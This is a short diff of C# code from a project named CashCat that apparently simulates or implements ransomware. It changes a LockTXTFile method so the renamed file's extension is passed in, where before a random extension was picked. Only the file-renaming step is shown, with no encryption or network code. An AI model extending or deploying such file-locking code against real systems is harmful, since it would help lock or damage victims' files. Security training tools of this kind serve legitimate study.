@@ -112,12 +112,15 @@ namespace CashCat
             return Files;
         }
 
-        public void LockTXTFile(FileInfo file)
+        public void LockTXTFile(FileInfo file, string extension)
         {
             string oldfilename = file.Name;
 
+            // todo optional mode? 
+            //string newExtension = RandomwareFileList.GetRandomFileExtension();
 
-            string newExtension = RandomwareFileList.GetRandomFileExtension();
+            string newExtension = extension;
+
 
             string newfilename = (file.Name).Replace(".txt", newExtension);
             string oldfileExtension = file.Extension;
